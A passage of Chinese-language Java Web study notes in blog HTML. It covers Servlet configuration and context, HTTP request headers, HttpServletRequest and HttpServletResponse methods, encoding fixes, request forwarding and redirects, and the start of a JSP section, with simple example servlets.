src="/2021/11/30/javaWeb/image-20211127153541217.png" alt="image-20211127153541217"></p><h3 id="Servlet-类的继承体系"><a href="#Servlet-类的继承体系" class="headerlink" title="Servlet 类的继承体系"></a>Servlet 类的继承体系</h3><p><img src="/2021/11/30/javaWeb/image-20211127153649970.png" alt="image-20211127153649970"></p><h3 id="ServletConfig-类"><a href="#ServletConfig-类" class="headerlink" title="ServletConfig 类"></a>ServletConfig 类</h3><p>ServletConfig 类从类名上来看，就知道是 Servlet 程序的配置信息类。</p><p> Servlet 程序和 ServletConfig 对象都是由 Tomcat 负责创建，我们负责使用。</p><p> Servlet 程序默认是第一次访问的时候创建，ServletConfig 是每个 Servlet 程序创建时，就创建一个对应的 ServletConfig 对 象。</p><h4 id="ServletConfig-类的三大作用"><a href="#ServletConfig-类的三大作用" class="headerlink" title="ServletConfig 类的三大作用"></a>ServletConfig 类的三大作用</h4><p><img src="/2021/11/30/javaWeb/image-20211127153805857.png" alt="image-20211127153805857"></p><p>1、<img src="/2021/11/30/javaWeb/image-20211127153913634.png" alt="image-20211127153913634"></p><p><img src="/2021/11/30/javaWeb/image-20211127153940484.png" alt="image-20211127153940484"></p><p><img src="/2021/11/30/javaWeb/image-20211127153952252.png" alt="image-20211127153952252"></p><h3 id="ServletContext-类"><a href="#ServletContext-类" class="headerlink" title="ServletContext 类"></a>ServletContext 类</h3><p><img src="/2021/11/30/javaWeb/image-20211127154043304.png" alt="image-20211127154043304"></p><h4 id="ServletContext-类的四个作用"><a href="#ServletContext-类的四个作用" class="headerlink" title="ServletContext 类的四个作用"></a>ServletContext 类的四个作用</h4><ol><li><p>获取 web.xml 中配置的上下文参数 context-param </p></li><li><p>获取当前的工程路径，格式: /工程路径 </p></li><li><p>获取工程部署后在服务器硬盘上的绝对路径 </p></li><li><p>像 Map 一样存取数据 ，可以用于数据共享</p><p><img src="/2021/11/30/javaWeb/image-20211127154149188.png" alt="image-20211127154149188"></p></li></ol><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="常用请求头的说明"><a href="#常用请求头的说明" class="headerlink" title="常用请求头的说明"></a>常用请求头的说明</h4><ul><li>Accept: 表示客户端可以接收的数据类型 </li><li>Accpet-Languege: 表示客户端可以接收的语言类型 </li><li>User-Agent: 表示客户端浏览器的信息 </li><li>Host： 表示请求时的服务器 ip 和端口号</li></ul><h4 id="哪些是-GET-请求，哪些是-POST-请求"><a href="#哪些是-GET-请求，哪些是-POST-请求" class="headerlink" title="哪些是 GET 请求，哪些是 POST 请求"></a>哪些是 GET 请求，哪些是 POST 请求</h4><p>GET 请求有哪些： </p><ol><li><p>form 标签 method=get</p></li><li><p>a 标签 </p></li><li><p>link 标签引入 css</p></li><li><p>Script 标签引入 js 文件</p></li><li><p>img 标签引入图片 </p></li><li><p>iframe 引入 html 页面 </p></li><li><p>在浏览器地址栏中输入地址后敲回车 </p><p>POST 请求有哪些</p><ol><li>form 标签 method=post</li></ol></li></ol><h2 id="HttpServletRequest-类"><a href="#HttpServletRequest-类" class="headerlink" title="HttpServletRequest 类"></a>HttpServletRequest 类</h2><p>每次只要有请求进入 Tomcat 服务器，Tomcat 服务器就会把请求过来的 HTTP 协议信息解析好封装到 Request 对象中。 然后传递到 service 方法（doGet 和 doPost）中给我们使用。我们可以通过 HttpServletRequest 对象，获取到所有请求的 信息。</p><h4 id="HttpServletRequest-类的常用方法"><a href="#HttpServletRequest-类的常用方法" class="headerlink" title="HttpServletRequest 类的常用方法"></a>HttpServletRequest 类的常用方法</h4><ul><li><strong>getRequestURI() 获取请求的资源路径</strong></li><li><strong>getRequestURL() 获取请求的统一资源定位符（绝对路径）</strong> </li><li><strong>getRemoteHost() 获取客户端的 ip 地址</strong></li><li><strong>getHeader() 获取请求头</strong> </li><li><strong>getParameter() 获取请求的参数</strong></li><li><strong>getParameterValues() 获取请求的参数（多个值的时候使用）</strong></li><li><strong>getMethod() 获取请求的方式 GET 或 POST</strong> </li><li><strong>setAttribute(key, value); 设置域数据</strong></li><li>**getAttribute(key); 获取域数据 **</li><li><strong>getRequestDispatcher() 获取请求转发对象</strong></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RequestAPIServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取请求资源路径</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"URI -> "</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取绝对路径</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"URL -> "</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getRequestURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取客户端IP</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"IP -> "</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getRemoteHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取请求头</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> <span class="token string">"User-Agent -> "</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取请求方式</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请求方式 ->"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ParameterServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        request<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置字体防止乱码</span>        String username <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String password <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> hobbies <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户名: "</span> <span class="token operator">+</span> username <span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"密码 : "</span> <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"爱好 ： "</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>hobbies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        String username <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String password <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> hobbies <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取复选框的内容使用这个方法</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户名: "</span> <span class="token operator">+</span> username <span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"密码 : "</span> <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"爱好 ： "</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>hobbies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//下面html代码</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>Title<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://localhost:8080/071_RequestServlet/parameterServlet"</span> method<span class="token operator">=</span><span class="token string">"post"</span> <span class="token operator">/</span><span class="token operator">></span>        用户名： <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span> <span class="token operator">/</span><span class="token operator">></span>        密码 <span class="token operator">:</span>   <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>        兴趣爱好<span class="token operator">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> name<span class="token operator">=</span><span class="token string">"hobby"</span> value<span class="token operator">=</span><span class="token string">"cpp"</span><span class="token operator">/</span><span class="token operator">></span> C<span class="token operator">++</span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> name<span class="token operator">=</span><span class="token string">"hobby"</span> value<span class="token operator">=</span><span class="token string">"java"</span><span class="token operator">/</span><span class="token operator">></span> java        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> name<span class="token operator">=</span><span class="token string">"hobby"</span> value<span class="token operator">=</span><span class="token string">"python"</span><span class="token operator">/</span><span class="token operator">></span> python <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="doGet-请求的中文乱码解决"><a href="#doGet-请求的中文乱码解决" class="headerlink" title="doGet 请求的中文乱码解决"></a>doGet 请求的中文乱码解决</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 获取请求参数</span>String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1 先以 iso8859-1 进行编码</span><span class="token comment" spellcheck="true">//2 再以 utf-8 进行解码</span>username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>username<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"iso-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="POST-请求的中文乱码解决"><a href="#POST-请求的中文乱码解决" class="headerlink" title="POST 请求的中文乱码解决"></a>POST 请求的中文乱码解决</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span>IOException<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 设置请求体的字符集为 UTF-8，从而解决 post 请求的中文乱码问题</span>    req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------------doPost------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//要在获取参数设置字符编码</span>        <span class="token comment" spellcheck="true">// 获取请求参数</span>    String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String<span class="token punctuation">[</span><span class="token punctuation">]</span> hobby <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户名："</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"密码："</span> <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"兴趣爱好："</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>hobby<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="请求的转发"><a href="#请求的转发" class="headerlink" title="请求的转发"></a>请求的转发</h3><p>什么是请求的转发? 请求转发是指，服务器收到请求后，从一次资源跳转到另一个资源的操作叫请求转发。</p><p><img src="/2021/11/30/javaWeb/image-20211127154748403.png" alt="image-20211127154748403"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**************************Servlet1代码***************************/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Servlet1</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span>            IOException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 获取请求的参数（办事的材料）查看</span>        String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"在 Servlet1（柜台 1）中查看参数（材料）："</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 给材料 盖一个章，并传递到 Servlet2（柜台 2）去查看</span>        req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span><span class="token string">"柜台 1 的章"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 问路：Servlet2（柜台 2）怎么走</span><span class="token comment" spellcheck="true">/** * 请求转发必须要以斜杠打头，/ 斜杠表示地址为：http://ip:port/工程名/ , 映射到 IDEA 代码的 web 目录 &lt;br/> * */</span>        RequestDispatcher requestDispatcher <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/servlet2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// RequestDispatcher requestDispatcher = req.getRequestDispatcher("http://www.baidu.com");</span><span class="token comment" spellcheck="true">// 走向 Sevlet2（柜台 2）</span>        requestDispatcher<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//为了方面也写成：  req.getRequestDispatcher("/servlet2").forward(req,resp);</span><span class="token comment" spellcheck="true">/***********************Servlet2 代码***********************/</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Servlet2</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span>            IOException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 获取请求的参数（办事的材料）查看</span>        String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"在 Servlet2（柜台 2）中查看参数（材料）："</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 查看 柜台 1 是否有盖章</span>        Object key1 <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"柜台 1 是否有章："</span> <span class="token operator">+</span> key1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 处理自己的业务</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Servlet2 处理自己的业务 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HttpServletResponse-类"><a href="#HttpServletResponse-类" class="headerlink" title="HttpServletResponse 类"></a>HttpServletResponse 类</h2><p>HttpServletResponse 类和 HttpServletRequest 类一样。每次请求进来，Tomcat 服务器都会创建一个 Response 对象传 递给 Servlet 程序去使用。HttpServletRequest 表示请求过来的信息，HttpServletResponse 表示所有响应的信息， 我们如果需要设置返回给客户端的信息，都可以通过 HttpServletResponse 对象来进行设置。</p><h4 id="两个输出流的说明"><a href="#两个输出流的说明" class="headerlink" title="两个输出流的说明"></a>两个输出流的说明</h4><ul><li>字节流 getOutputStream(); 常用于下载（传递二进制数据） </li><li>字符流 getWriter(); 常用于回传字符串（常用） 两个流同时只能使用一个。</li></ul><p>使用了字节流，就不能再使用字符流，反之亦然，否则就会报错。</p><h4 id="如何往客户端回传数据"><a href="#如何往客户端回传数据" class="headerlink" title="如何往客户端回传数据"></a>如何往客户端回传数据</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ResponseIOServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span>            IOException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 要求 ： 往客户端回传 字符串 数据。</span>        PrintWriter writer <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"response's content!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="响应的乱码解决"><a href="#响应的乱码解决" class="headerlink" title="响应的乱码解决"></a>响应的乱码解决</h4><pre class="line-numbers language-java"><code class="language-java">            <span class="token comment" spellcheck="true">/*解决响应中文乱码方案一（不推荐使用）：*/</span>        <span class="token comment" spellcheck="true">// 设置服务器字符集为 UTF-8</span>        resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过响应头，设置浏览器也使用 UTF-8 字符集</span>        resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*-----------------------------------------------------------------------------*/</span>          <span class="token comment" spellcheck="true">/*解决响应中文乱码方案二（推荐）：*/</span>        <span class="token comment" spellcheck="true">// 它会同时设置服务器和客户端都使用 UTF-8 字符集，还设置了响应头</span><span class="token comment" spellcheck="true">// 此方法一定要在获取流对象之前调用才有效</span>        resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="请求重定向"><a href="#请求重定向" class="headerlink" title="请求重定向"></a>请求重定向</h3><p>请求重定向，是指客户端给服务器发请求，然后服务器告诉客户端说。我给你一些地址。你去新地址访问。叫请求 重定向（因为之前的地址可能已经被废弃）。</p><p><img src="/2021/11/30/javaWeb/image-20211127155503820.png" alt="image-20211127155503820"></p><pre class="line-numbers language-java"><code class="language-java">         <span class="token comment" spellcheck="true">/*请求重定向的第一种方案：*/</span>        <span class="token comment" spellcheck="true">// 设置响应状态码 302 ，表示重定向，（已搬迁）</span>        resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置响应头，说明 新的地址在哪里</span>        resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost:8080"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*-----------------------------------------------------*/</span>        <span class="token comment" spellcheck="true">//请求重定向的第二种方案（推荐使用）：</span>        resp<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8080"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="什么是jsp"><a href="#什么是jsp" class="headerlink" title="什么是jsp"></a>什么是jsp</h3><p>JSP(全称 Java Server Pages)是由 Sun 公司专门为了解决动态生成 HTML 文档的技术。</p><h3 id="为什么使用jsp"><a href="#为什么使用jsp" class="headerlink" title="为什么使用jsp"></a>为什么使用jsp</h3><pre class="line-numbers language-java"><code class="language-java"> <span class="token comment" spellcheck="true">/*---------------------------------------------------------------------------------    如果我们使用HttpServletResponse类的话向客户端发送数据，要在write里面写上HMTL，这样显然是不好的  ---------------------------------------------------------------------------------*/</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                         HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 设置返回的数据内容的数据类型和编码</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取字符输出流</span>        Writer writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出页面内容！</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>"<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC \"<span class="token operator">-</span><span class="token comment" spellcheck="true">//W3C//DTD HTML 4.01 Transitional//EN\"</span>                \<span class="token string">"http://www.w3.org/TR/html4/loose.dtd\">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;html>"</span><span class="token 